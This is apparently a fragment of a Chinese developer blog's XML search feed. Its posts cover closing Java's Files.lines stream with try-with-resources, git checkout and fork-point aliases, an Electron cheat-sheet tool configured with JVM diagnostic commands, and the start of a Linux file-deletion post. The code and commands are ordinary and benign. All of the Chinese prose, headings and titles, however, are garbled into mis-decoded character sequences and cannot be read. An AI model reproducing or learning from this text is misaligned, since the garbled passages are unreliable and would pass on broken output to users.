reading from the file or when a malformed or unmappable byte</span></span><br><span class="line"><span class="comment">     * sequence is read, is wrapped in an &#123;<span class="doctag">@link</span> UncheckedIOException&#125; that will</span></span><br><span class="line"><span class="comment">     * be thrown from the</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> java.util.stream.Stream&#125; method that caused the read to take</span></span><br><span class="line"><span class="comment">     * place. In case an &#123;<span class="doctag">@code</span> IOException&#125; is thrown when closing the file,</span></span><br><span class="line"><span class="comment">     * it is also wrapped as an &#123;<span class="doctag">@code</span> UncheckedIOException&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt; The returned stream encapsulates a &#123;<span class="doctag">@link</span> Reader&#125;.  If timely</span></span><br><span class="line"><span class="comment">     * disposal of file system resources is required, the try-with-resources</span></span><br><span class="line"><span class="comment">     * construct should be used to ensure that the stream's</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Stream#close close&#125; method is invoked after the stream operations</span></span><br><span class="line"><span class="comment">     * are completed.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   path</span></span><br><span class="line"><span class="comment">     *          the path to the file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   cs</span></span><br><span class="line"><span class="comment">     *          the charset to use for decoding</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>  the lines from the file as a &#123;<span class="doctag">@code</span> Stream&#125;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span>  IOException</span></span><br><span class="line"><span class="comment">     *          if an I/O error occurs opening the file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span>  SecurityException</span></span><br><span class="line"><span class="comment">     *          In the case of the default provider, and a security manager is</span></span><br><span class="line"><span class="comment">     *          installed, the &#123;<span class="doctag">@link</span> SecurityManager#checkRead(String) checkRead&#125;</span></span><br><span class="line"><span class="comment">     *          method is invoked to check read access to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span>     #readAllLines(Path, Charset)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span>     #newBufferedReader(Path, Charset)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span>     java.io.BufferedReader#lines()</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span>   1.8</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Stream&lt;String&gt; <span class="title">lines</span><span class="params">(Path path, Charset cs)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedReader br = Files.newBufferedReader(path, cs);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> br.lines().onClose(asUncheckedRunnable(br));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Error|RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                br.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    e.addSuppressed(ex);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable ignore) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹çœ‹è¿™å‡ å¥ï¼Œ </p>
<blockquote>
<p>The returned stream encapsulates a Reader.  If timely disposal of file system resources is required, the try-with-resources construct should be used to ensure that the streamâ€™s <code>Stream#close</code> method is invoked  after the stream operations are completed.</p>
</blockquote>
<p>å¦‚æœéœ€è¦åŠæ—¶åœ°æ¸…ç†ç³»ç»Ÿçš„èµ„æºï¼Œ å¯ä»¥ä½¿ç”¨java7ä¸­å¼•å…¥çš„<code>try-with-resources</code>, æ¥ç¡®ä¿<code>Stream</code>çš„<code>close</code>æ–¹æ³•åœ¨ä½¿ç”¨å®Œåè¢«è°ƒç”¨ã€‚</p>
<p><code>Files.lines</code>æ˜¯æƒ°æ€§çš„ï¼Œ å½“ä½ ä½¿ç”¨çš„æ—¶å€™æ‰å»è¯»å–ï¼Œ æ‰€ä»¥éœ€è¦æ‰‹åŠ¨çš„å…³é—­æµï¼Œ <code>Files.readAllLines</code>è¿™ä¸ªæ–¹æ³•åˆ™æ˜¯ä¸€æ¬¡æŠŠæ–‡ä»¶<br>ä¸­çš„æ‰€æœ‰è¡Œè¯»å–åˆ°å†…å­˜ä¸­å»ï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨çš„å…³é—­æ–‡ä»¶ã€‚</p>
<p><code>Files.readAllLines</code>çš„å‡½æ•°è¯´æ˜ä¸­å°±ä¿è¯äº†åº•å±‚çš„æ–‡ä»¶ä¸€å®šä¼šè¢«å…³é—­ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Read all lines from a file. This method ensures that the file is</span></span><br><span class="line"><span class="comment">    * closed when all bytes have been read or an I/O error, or other runtime</span></span><br><span class="line"><span class="comment">    * exception, is thrown. Bytes from the file are decoded into characters</span></span><br><span class="line"><span class="comment">    * using the specified charset.</span></span><br><span class="line"><span class="comment">    **/</span></span><br></pre></td></tr></table></figure>
<h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>ä½¿ç”¨java7ä¸­å¼•å…¥çš„<code>try-with-resoucres</code>, å®ç°äº†<code>AutoCloseable</code>æ¥å£çš„éƒ½ä¼šè¢«è‡ªåŠ¨çš„å…³é—­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> ( Stream&lt;String&gt; stream = Files.lines(path, charset) ) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="https://stackoverflow.com/questions/38698182/close-java-8-stream" rel="external nofollow noopener noreferrer" target="_blank">Close Java 8 Stream - Stack Overflow</a></p>
</li>
<li><p><a href="https://stackoverflow.com/questions/37659872/do-i-have-to-close-terminated-streamed-query-results-in-a-try-with-resources-bl" rel="external nofollow noopener noreferrer" target="_blank">java - Do I have to close terminated, streamed query results in a try-with-resources-block? - Stack Overflow</a></p>
</li>
<li><p><a href="http://calvin1978.blogcn.com/articles/latency2.html" rel="external nofollow noopener noreferrer" target="_blank">åœ¨ä½ çš„ä»£ç ä¹‹å¤–ï¼ŒæœåŠ¡æ—¶å»¶è¿‡é•¿çš„ä¸‰ä¸ªè¿½æŸ¥æ–¹å‘(ä¸‹) | æ±Ÿå—ç™½è¡£</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[git-checkout å¸¸ç”¨å‘½ä»¤]]></title>
      <url>http://qsli.github.io/2017/09/12/git-checkout/</url>
      <content type="html"><![CDATA[<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ul>
<li>ä»å¦å¤–ä¸€ä¸ªåˆ†æ”¯æ£€å‡ºæ–‡ä»¶</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout source_branch &lt;paths&gt;...</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="http://jasonrudolph.com/blog/2009/02/25/git-tip-how-to-merge-specific-files-from-another-branch/" rel="external nofollow noopener noreferrer" target="_blank">Git tip: How to â€œmergeâ€ specific files from another branch - jasonrudolph.com</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> git </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gitæŸ¥çœ‹å·²åˆå¹¶åˆ†æ”¯çš„forkç‚¹]]></title>
      <url>http://qsli.github.io/2017/09/12/git-branch-log/</url>
      <content type="html"><![CDATA[<h2 id="ä¸€ä¸ªé—®é¢˜"><a href="#ä¸€ä¸ªé—®é¢˜" class="headerlink" title="ä¸€ä¸ªé—®é¢˜"></a>ä¸€ä¸ªé—®é¢˜</h2><p>æœ‰äº›éœ€æ±‚æœ‰å¥½å‡ æœŸï¼Œåšåé¢å‡ æœŸçš„å¯èƒ½å®Œå…¨ä¸äº†è§£å‰å‡ æœŸåšäº†ä»€ä¹ˆï¼Œæ‹¿åˆ°åˆ†æ”¯å·åï¼Œå°±éœ€è¦æ‰¾åˆ°æœ€åˆçš„commitç‚¹ã€‚ç”±äºè¿™ä¸ªåˆ†æ”¯å·²ç»mergeåˆ°äº†masterä¸Šï¼Œæ‰€ä»¥æ‰¾æœ€è¿‘çš„ancestorå°±ä¸å¯¹äº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge-base branch1 branch2 //åªèƒ½æ‰¾åˆ°æœ€è¿‘çš„ç¥–å…ˆ</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆå¦‚ä½•æ‰¾åˆ°è¿™ä¸ªåˆ†æ”¯æœ€åˆçš„forkç‚¹å‘¢ï¼Œä¸‹é¢ç»™å‡ºä¸¤ç§æ–¹æ¡ˆï¼Œäº²æµ‹æœ‰æ•ˆã€‚</p>
<h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><h3 id="git-åˆ«å"><a href="#git-åˆ«å" class="headerlink" title="git åˆ«å"></a>git åˆ«å</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global alias.oldest-ancestor <span class="string">'!zsh -c '</span>\<span class="string">''</span>diff -u &lt;(git rev-list --first-parent <span class="string">"<span class="variable">$&#123;1:-master&#125;</span>"</span>) &lt;(git rev-list --first-parent <span class="string">"<span class="variable">$&#123;2:-HEAD&#125;</span>"</span>) | sed -ne <span class="string">"s/^ //p"</span> | head -1<span class="string">'\'</span><span class="string">' -'</span></span><br><span class="line">git config --global alias.branchdiff <span class="string">'!sh -c "git diff `git oldest-ancestor`.."'</span></span><br><span class="line">git config --global alias.branchlog <span class="string">'!sh -c "git log `git oldest-ancestor`.."'</span></span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°ä¸‰ä¸ªå‘½ä»¤å°±å¯ä»¥æ‰¾åˆ°æœ€åˆçš„commitç‚¹ï¼Œä»¥åŠè¿™ä¸ªåˆ†æ”¯åšäº†ä»€ä¹ˆã€‚å‚è§<code>stackoverflow</code>ä¸Šçš„å›ç­”:  <a href="https://stackoverflow.com/questions/1527234/finding-a-branch-point-with-git" rel="external nofollow noopener noreferrer" target="_blank">Finding a branch point with Git? - Stack Overflow</a></p>
<h3 id="gitåˆ†æ”¯å›¾"><a href="#gitåˆ†æ”¯å›¾" class="headerlink" title="gitåˆ†æ”¯å›¾"></a>gitåˆ†æ”¯å›¾</h3><p>å¦‚æœä½ ä½¿ç”¨<code>zsh</code>, å†…ç½®çš„æœ‰ä¸¤ä¸ªç›¸å…³çš„å‘½ä»¤<code>glgg</code>,<code>glgga</code>.</p>
<ul>
<li><code>glgg</code>ï¼š æ˜¾ç¤ºå½“å‰åˆ†æ”¯çš„åˆ†æ”¯å›¾</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~  <span class="built_in">alias</span> glgg</span><br><span class="line">glgg=<span class="string">'git log --graph'</span></span><br></pre></td></tr></table></figure>
<img src="/2017/09/12/git-branch-log/glgg.png">
<ul>
<li><code>glgga</code>: æ˜¾ç¤ºæ‰€æœ‰åˆ†æ”¯çš„åˆ†æ”¯å›¾ </li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~  <span class="built_in">alias</span> glgga</span><br><span class="line">glgga=<span class="string">'git log --graph --decorate --all'</span></span><br></pre></td></tr></table></figure>
<img src="/2017/09/12/git-branch-log/glgga.png">
<p>ä»åˆ†æ”¯å›¾ä¸­å¯ä»¥å¿«é€Ÿçš„çœ‹å‡ºå½“å‰åˆ†æ”¯æ˜¯åœ¨å“ªé‡Œforkå‡ºæ¥çš„</p>
<h4 id="åˆ†æ”¯å›¾çš„æ˜¾ç¤ºæ–¹å¼"><a href="#åˆ†æ”¯å›¾çš„æ˜¾ç¤ºæ–¹å¼" class="headerlink" title="åˆ†æ”¯å›¾çš„æ˜¾ç¤ºæ–¹å¼"></a>åˆ†æ”¯å›¾çš„æ˜¾ç¤ºæ–¹å¼</h4><ul>
<li><p>reverse chronologicalï¼š é»˜è®¤æ˜¾ç¤ºæ–¹å¼ï¼Œä¼šæŒ‰ç…§commitçš„æ—¶é—´ï¼Œé€†åºæ˜¾ç¤º</p>
</li>
<li><p>topo orderï¼š æŒ‰ç…§commitçš„æ‹“æ‰‘é¡ºåºæ˜¾ç¤ºï¼Œå­æäº¤åœ¨çˆ¶æäº¤ä¹‹å‰æ˜¾ç¤º</p>
</li>
</ul>
<p>æŸ¥çœ‹forkç‚¹çš„æ—¶å€™ï¼Œæœ€å¥½æ˜¯æŒ‰ç…§æ‹“æ‰‘æ’åºæ˜¾ç¤ºï¼Œè¿™æ ·åˆ†æ”¯å›¾ä¸ä¼šå¾ˆä¹±ï¼Œä¾¿äºæ‰¾åˆ°ã€‚</p>
<h3 id="å¯è§†åŒ–å·¥å…·"><a href="#å¯è§†åŒ–å·¥å…·" class="headerlink" title="å¯è§†åŒ–å·¥å…·"></a>å¯è§†åŒ–å·¥å…·</h3><p>å¯è§†åŒ–å·¥å…·å’Œgit logçš„ç”¨æ³•æ˜¯ä¸€æ ·çš„ï¼Œé¡ºç€æŸ¥æ‰¾å³å¯ã€‚è¿™é‡Œæˆ‘ç”¨<code>idea</code>ä¸ºä¾‹ï¼š</p>
<img src="/2017/09/12/git-branch-log/idea.png">
<p>å¼€å¯InteliSortåï¼Œæ³¨æ„çº¢æ¡†å‹¾ä¸Šã€‚</p>
<img src="/2017/09/12/git-branch-log/idea-sorted.png">
<p>å¼€å¯åæ˜¯æŒ‰ç…§æäº¤æ’åºçš„ï¼Œå¹¶æ²¡æœ‰æŒ‰ç…§æ’å…¥çš„æ—¶é—´ï¼Œè¿™æ ·å¯ä»¥æ¸…æ¥šçš„é¡ºç€æäº¤æ‰¾åˆ°æœ€åˆçš„forkç‚¹ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="https://stackoverflow.com/questions/1527234/finding-a-branch-point-with-git" rel="external nofollow noopener noreferrer" target="_blank">Finding a branch point with Git? - Stack Overflow</a></p>
</li>
<li><p><a href="http://www.cnblogs.com/chucklu/p/4748394.html" rel="external nofollow noopener noreferrer" target="_blank">gitå›¾ç¤ºæ‰€æœ‰åˆ†æ”¯çš„å†å² - ChuckLu - åšå®¢å›­</a></p>
</li>
<li><p><a href="http://gitbook.liuhui998.com/3_4.html" rel="external nofollow noopener noreferrer" target="_blank">Git Book ä¸­æ–‡ç‰ˆ - æŸ¥çœ‹å†å² ï¼Gitæ—¥å¿—</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> git </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
            <tag> idea </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ç”¨electronå¼€å‘è‡ªå·±çš„å·¥å…·]]></title>
      <url>http://qsli.github.io/2017/09/10/electron/</url>
      <content type="html"><![CDATA[<h2 id="electron-ç®€ä»‹"><a href="#electron-ç®€ä»‹" class="headerlink" title="electron ç®€ä»‹"></a>electron ç®€ä»‹</h2><p>webæ˜¯å¤©ç”Ÿè·¨å¹³å°çš„ã€‚</p>
<p>å‰å‡ å¹´ç”¨ubuntuçš„æ—¶å€™ï¼Œå„ç§è½¯ä»¶éƒ½æ²¡æœ‰ç›¸åº”çš„ç‰ˆæœ¬ï¼Œååˆ†çš„è›‹ç–¼ã€‚è¿™å‡ å¹´éšç€webçš„å‘å±•ï¼Œæƒ…å†µæ”¹å–„äº†è®¸å¤šã€‚<br>æ¯”å¦‚è¯´chromeçš„appï¼Œ å®‰è£…å¥½ä¹‹åå’ŒåŸç”Ÿçš„åº”ç”¨å‡ ä¹æ²¡æœ‰åŒºåˆ«ï¼Œå¯ä»¥ä»ubuntuçš„dashé‡Œé¢æœç´¢åˆ°ï¼Œå¯ä»¥ç‹¬ç«‹æ‰“å¼€ã€‚</p>
<p><code>electron</code>åˆ™æ˜¯ç›´æ¥æ•´ä¸€ä¸ªå¾®å‹çš„chromeï¼ŒåŠ ä¸Šhtmlå†™çš„ç•Œé¢ï¼Œç›´æ¥åšå®¢æˆ·ç«¯ã€‚ä¹Ÿæœ‰ç±»ä¼¼<code>atom</code>ï¼Œ <code>visual source code</code>ç­‰å¤§å‹åº”ç”¨ä¹Ÿæ˜¯ä½¿ç”¨<code>electron</code>æ„å»ºçš„ã€‚</p>
<img src="/2017/09/10/electron/electron.jpg">
<h2 id="ç®€å•çš„æƒ³æ³•"><a href="#ç®€å•çš„æƒ³æ³•" class="headerlink" title="ç®€å•çš„æƒ³æ³•"></a>ç®€å•çš„æƒ³æ³•</h2><p>ä¹‹å‰åœ¨windowså¹³å°ï¼Œä½¿ç”¨çš„éå¸¸é¡ºæ‰‹çš„ä¸€ä¸ªå‰ªè´´æ¿å¢å¼ºå·¥å…·â€”â€”<a href="http://www.appinn.com/clibor/" rel="external nofollow noopener noreferrer" target="_blank">Clibor â€“ æ¥è‡ªæ—¥æœ¬çš„å‰ªè´´æ¿è¾…åŠ©å·¥å…·[Win] - å°ä¼—è½¯ä»¶</a>ï¼Œ è¿™ä¸ªè½¯ä»¶éå¸¸å¥½ç”¨çš„ä¸€ä¸ªåŠŸèƒ½å°±æ˜¯æ”¯æŒ<code>å®šå‹æ–‡</code>ã€‚æ‰€è°“çš„<code>å®šå‹æ–‡</code>å°±æ˜¯ä½ äº‹å…ˆå½•åˆ¶å¥½çš„ä¸€äº›å¸¸ç”¨çš„<br>æ¡ç›®ï¼Œç„¶åå½“ä½ éœ€è¦ä½¿ç”¨çš„æ—¶å€™ï¼ŒæŒ‰å¿«æ·é”®å‘¼å‡ºç•Œé¢ï¼Œé€‰ä¸­æƒ³è¦çš„<code>å®šå‹æ–‡</code>ï¼Œç›´æ¥å°±ç»™ä½ å¤åˆ¶åˆ°äº†å‰ªè´´æ¿ï¼Œååˆ†çš„æ–¹ä¾¿ã€‚</p>
<img src="/2017/09/10/electron/item.png">
<p>windowsä¸çˆ½çš„å°±æ˜¯shellä¸å¥½ç”¨ï¼Œ è™½ç„¶æœ‰<code>cygwin</code>,<code>babun</code>ï¼Œ<code>cmder</code>ç­‰è¿˜ç®—ä¸é”™çš„ç»ˆç«¯ï¼Œä½†æ˜¯ç”¨èµ·æ¥å¡å¡çš„ï¼Œæ‰€ä»¥æœ€ç»ˆæˆ‘è¿˜æ˜¯è¿ç§»åˆ°äº†ubuntuï¼Œå„ç§å‘½ä»¤ï¼Œå„ç§çˆ½ã€‚</p>
<p>ä½†æ˜¯ï¼Œä½œä¸ºä¸€ä¸ªåç«¯çš„å¼€å‘ï¼Œæ¯å¤©è¦ä¸ŠæœåŠ¡å™¨ä¸ŠæŸ¥å„ç§é—®é¢˜ï¼Œå„ç§é•¿é•¿çš„å‘½ä»¤ï¼Œå„ç§è®°ä¸ä½ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦æœ‰ä¸€ä¸ªç±»ä¼¼å°æŠ„è¯•çš„å·¥å…·æ¥å¢å¼ºä¸‹å·¥ä½œæ•ˆç‡ã€‚æ°å·§ï¼Œä¸Šæ¬¡åœ¨youtubeä¸Šçœ‹electornçš„ä¸€ä¸ªè§†é¢‘â€”â€”<a href="https://www.youtube.com/watch?v=FNHBfN8c32U" rel="external nofollow noopener noreferrer" target="_blank">Electron: Desktop Apps with Web Languages - GitHub Universe 2016 - YouTube</a>ã€‚è¿™ä¸ªè§†é¢‘å¤§æ¦‚ä»‹ç»äº†electronï¼Œä»‹ç»äº†ä¸€äº›ä½¿ç”¨electronå¼€å‘çš„æœ‰æ„æ€çš„åº”ç”¨ï¼Œ æ°å·§æˆ‘çœ‹åˆ°äº†ä¸€ä¸ªå«åš<code>mojibar</code>çš„ç®€å•åº”ç”¨ã€‚</p>
<img src="/2017/09/10/electron/mojibar.gif">
<p>å¥¹çš„è¿™ä¸ªåº”ç”¨æ˜¯ï¼Œæœç´¢mojiè¡¨æƒ…å¯¹åº”çš„æ–‡å­—ï¼Œ ç„¶åä¼šç­›é€‰å‡ºæ¥ç›¸åº”çš„ç»“æœï¼Œç„¶åå¤åˆ¶åˆ°å‰ªè´´æ¿ä¸Šï¼Œæ”¯æŒå¿«æ·é”®å‘¼å‡ºã€‚çœ‹åˆ°è¿™ä¸ªå°±ç¬é—´æ¥äº†çµæ„Ÿï¼Œè¿™å’Œæˆ‘è¦çš„å°æŠ„åº”ç”¨ç®€ç›´ååˆ†å»åˆã€‚å¥½åœ¨<code>electron</code>å¹¶ä¸å¤æ‚ï¼Œå°±ç ”ç©¶äº†ä¸‹ä»£ç è‡ªå·±æ”¹é€ äº†ä¸€ç•ªï¼Œäºæ˜¯å°±æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚</p>
<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>è¿™ä¸ªdemoåŸºæœ¬å¯ä»¥åœ¨æ—¥å¸¸çš„å·¥ä½œä¸­ä½¿ç”¨äº†ï¼Œ githubçš„repoåœ¨â€”â€”<a href="https://github.com/qsLI/quake-select" rel="external nofollow noopener noreferrer" target="_blank">qsLI/quake-select</a></p>
<p>ä¸‹é¢æ˜¯ç•Œé¢çš„æˆªå›¾ï¼š</p>
<img src="/2017/09/10/electron/select.png">
<p>é…ç½®æ–‡ä»¶åœ¨jsonä¸­ï¼Œç±»ä¼¼ä¸‹é¢çš„å½¢å¼ï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"commands"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">"æŸ¥çœ‹jvmå †çš„ä½¿ç”¨æƒ…å†µ"</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"sudo -u tomcat jmap -heap  `pgrep -f 'tomcat'`"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">"æŸ¥çœ‹jvmæœ€ç»ˆåŠ è½½çš„å¼€å…³"</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"java -XX:+PrintFlagsFinal -version"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"sudo -u tomcat jcmd `pgrep -f tomcat` VM.flags"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">"æŸ¥çœ‹jvmåŠ è½½çš„ç³»ç»Ÿå˜é‡"</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"sudo -u tomcat jcmd `pgrep -f tomcat` VM.system_properties"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">"æŸ¥çœ‹æœ¬æœºjcmdæ”¯æŒçš„å‘½ä»¤"</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"sudo -u tomcat jcmd `pgrep -f tomcat` help"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç›®å‰æ”¯æŒæŒ‰ç…§<code>command</code>å’Œ<code>tag</code>æœç´¢ï¼Œ mojibarä½¿ç”¨çš„è¿™ä¸ªåº“åœ¨ubuntuä¸‹èœå•ä¼šæ˜¾ç¤ºä¸å‡ºæ¥ï¼Œä»¥åæœ‰æ—¶é—´å†fixã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="https://electron.atom.io/" rel="external nofollow noopener noreferrer" target="_blank">Electron | Build cross platform desktop apps with JavaScript, HTML, and CSS.</a></p>
</li>
<li><p><a href="https://zhuanlan.zhihu.com/p/20225295" rel="external nofollow noopener noreferrer" target="_blank">ä½¿ç”¨ Electron æ„å»ºæ¡Œé¢åº”ç”¨ - çŸ¥ä¹ä¸“æ </a></p>
</li>
<li><p><a href="http://www.appinn.com/clibor/" rel="external nofollow noopener noreferrer" target="_blank">Clibor â€“ æ¥è‡ªæ—¥æœ¬çš„å‰ªè´´æ¿è¾…åŠ©å·¥å…·[Win] - å°ä¼—è½¯ä»¶</a></p>
</li>
<li><p><a href="https://www.youtube.com/watch?v=FNHBfN8c32U" rel="external nofollow noopener noreferrer" target="_blank">Electron: Desktop Apps with Web Languages - GitHub Universe 2016 - YouTube</a></p>
</li>
<li><p><a href="https://github.com/muan/mojibar" rel="external nofollow noopener noreferrer" target="_blank">muan/mojibar: Emoji searcher but as a menubar app.</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> fe </category>
            
        </categories>
        
        
        <tags>
            
            <tag> electron </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linuxä¸‹åˆ é™¤æ–‡ä»¶]]></title>
      <url>http://qsli.github.io/2017/09/10/how-to-delete-file-correctly/</url>
      <content type="html"><![CDATA[<h1 id="æ–‡ä»¶å­˜å‚¨"><a href="#æ–‡ä»¶å­˜å‚¨" class="headerlink" title="æ–‡ä»¶å­˜å‚¨"></a>æ–‡ä»¶å­˜å‚¨</h1><img src="/2017/09/10/how-to-delete-file-correctly/inode.png" title="linuxæ–‡ä»¶çš„å­˜å‚¨">
<h2 id="è½¯é“¾æ¥å’Œç¡¬é“¾æ¥"><a href="#è½¯é“¾æ¥å’Œç¡¬é“¾æ¥" class="headerlink" title="è½¯é“¾æ¥å’Œç¡¬é“¾æ¥"></a>è½¯é“¾æ¥å’Œç¡¬é“¾æ¥</h2><p>è½¯é“¾æ¥(Symbolic Link):</p>
<p>ç¡¬é“¾æ¥(Hard Link):</p>
<blockquote>
